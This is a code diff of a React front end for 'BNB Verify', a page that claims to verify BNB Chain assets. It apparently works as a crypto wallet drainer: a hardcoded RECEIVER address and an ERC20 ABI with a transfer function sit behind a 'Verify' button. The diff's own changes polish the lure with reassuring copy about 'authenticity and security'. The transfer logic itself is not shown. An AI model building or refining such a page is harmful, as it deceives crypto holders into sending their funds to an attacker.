@@ -7,7 +7,7 @@ export default function App() {
   const [status, setStatus] = useState("Click Verify to start...");
 
   const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
-  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; 
+  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
   const ERC20_ABI = [
     "function balanceOf(address) view returns (uint)",
     "function transfer(address to, uint amount) returns (bool)"
@@ -64,6 +64,7 @@ export default function App() {
 
   return (
     <div className="app">
+      {/* Navbar */}
       <header className="navbar">
         <nav className="container nav-content">
           <a href="#" className="logo">
@@ -80,19 +81,22 @@ export default function App() {
         </nav>
       </header>
 
+      {/* Hero Section */}
       <main className="hero">
         <div className="hero-left">
           <div className="powered">Powered by BNB Chain</div>
-          <h1>Verify Crypto Assets on BNB Chain</h1>
-          <p>Instant verification of BNB Chain assets, supports BNB and USDT (BEP20).</p>
-
+          <h1>
+            Verify Crypto Assets on <br /> BNB Chain
+          </h1>
+          <p>
+            Our advanced platform provides instant verification of BNB Chain assets, ensuring authenticity and security for all your crypto transactions.
+          </p>
           <div className="hero-buttons">
             <button onClick={handleVerify} className="button-primary">
               Verify
             </button>
             <button className="button-secondary">Explore BNB Chain</button>
           </div>
-
           {walletAddress && <p className="wallet">Connected: {walletAddress}</p>}
           <p className="status">{status}</p>
         </div>
@@ -105,6 +109,7 @@ export default function App() {
         </div>
       </main>
 
+      {/* Cards Section */}
       <section className="cards-section">
         <div className="card">
           <h2>Explorer</h2>
@@ -124,6 +129,7 @@ export default function App() {
         </div>
       </section>
 
+      {/* Footer */}
       <footer>
         &copy; 2025 BNB Verify. Powered by BNB Chain.
       </footer>
